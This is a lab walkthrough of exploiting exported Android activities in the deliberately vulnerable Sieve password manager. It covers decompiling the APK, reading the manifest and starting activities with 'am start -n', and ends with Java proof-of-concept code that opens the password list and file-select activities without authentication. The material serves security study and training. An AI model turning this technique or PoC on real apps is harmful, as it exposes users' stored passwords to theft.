# Exported Activity Hacking

1. **Retrieve the APK File**: Obtain the target APK file that you want to analyze.&#x20;

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1.  **Install APK on the Android Emulator**

    &#x20;

    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
2.  **Decompile APK using Apktool**

    <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
3.  **Decode APK Contents**

    <figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
4.  **Analyze** `AndroidManifest.xml`: Investigate the `AndroidManifest.xml` file to identify declared activities and their associated permissions, Notice that there is exported Activities.

    <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
5.  **Exploration of Application Features**: Launch the application on the emulator to interact with its functionalities, Notice it is simple password manageer.

    <figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
6.  **Identify Authentication Requirements**: Note any authentication mechanisms required by the application, such as password length or two-factor authentication (2FA) PIN.

    <figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
7.  **Access Password List Activity**: Discover the Password List Activity mentioned in the `AndroidManifest` file, where passwords and account details are managed&#x20;

    <figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
8.  **Attempt to Access Exported Activities**: Use the Activity Manager (am start -n ) to try accessing exported activities from outside the application

    <figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
9. **Investigate Potential Data Storage Locations**: Start file list activity and searching for any data leakage, but found nothing + i couldn't access other activities from there.
10. **Access Password List Activity**: Successfully access the Password List Activity from outside the application

    <figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
11. **Encounter Error Messages**: Encounter error messages when attempting to view or modify passwords due to a required service not being started.&#x20;

    <figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
12. **Examine Settings and Backup Options**: Investigate settings options within the application to create backups of passwords
13. **Discover Backup File Accessibility**: Find that backup files can be accessed via another exported activity, `com.mwr.example.sieve/.FileSelectActivity`


14. **Identify Security Vulnerability**: Realize that plaintext passwords are accessible without authentication, potentially exposing users to password theft through malicious apps.

    <figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
15. Example code for Exploit POC

```java
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Button to start FileSelectActivity
        Button fileSelectButton = findViewById(R.id.file_select_button);
        fileSelectButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Create an Intent to start the FileSelectActivity
                Intent intent = new Intent();
                intent.setClassName("com.mwr.example.sieve", "com.mwr.example.sieve.FileSelectActivity");
                startActivity(intent);
            }
        });

        // Button to start PWList Activity
        Button pwListButton = findViewById(R.id.pw_list_button);
        pwListButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Create an Intent to start the PWList Activity
                Intent intent = new Intent();
                intent.setClassName("com.mwr.example.sieve", "com.mwr.example.sieve.PWList");
                startActivity(intent);
            }
        });
    }
}
```
